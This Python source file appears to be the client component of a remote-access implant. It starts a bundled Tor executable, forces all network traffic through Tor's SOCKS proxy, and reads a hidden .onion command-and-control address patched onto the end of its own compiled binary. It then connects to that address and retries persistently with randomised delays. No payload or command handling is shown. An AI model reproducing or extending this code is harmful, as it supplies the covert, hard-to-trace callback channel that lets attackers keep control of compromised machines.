import socks
import socket
import subprocess as sp
import os
import sys
from time import sleep
from random import randint


class Tor:

    PATH = '.\\torbundle\\Tor\\tor.exe'

    def __init__(self):
        if os.name == 'nt':
            self.tor_process = self.start()
        socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)
        socket.socket = socks.socksocket

    def start(self):
        try:
            path = Tor.resource_path(self.PATH)
            tor_process = sp.Popen(path, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
        except sp.SubprocessError as error:
            print(str(error))
            sys.exit(1)
        return tor_process

    #required as pyInstaller changes the path of the tor expert bundle
    @staticmethod
    def resource_path(relative_path):
        base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        return os.path.join(base_path, relative_path)

    def read_address_from_binary(self):
        path = os.path.abspath(sys.executable)
        with open(path, 'rb') as f:
            data = f.read()
            onion = data[-67:-5].decode()
            port = int(data[-5:].decode())
        # onion,port = ("axz2zqbav3nrnoofvwfk6qzp76aujxcwoeqp5pefwr3hgkk5rvjlaqyd.onion",80)
        return onion, port


class ClientSocket:

    ENCODING = 'utf-8'
    CONNECTION_TIMEOUT = 30

    def __init__(self, remote_host, remote_port):
        self.remote_addr = (remote_host, remote_port)

    def create_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(self.remote_addr)
        except socket.error as err:
            print(err)
            timeout = randint(self.CONNECTION_TIMEOUT - 10, self.CONNECTION_TIMEOUT + 10)
            sleep(timeout)
            self.create_connection()
        else:
            return sock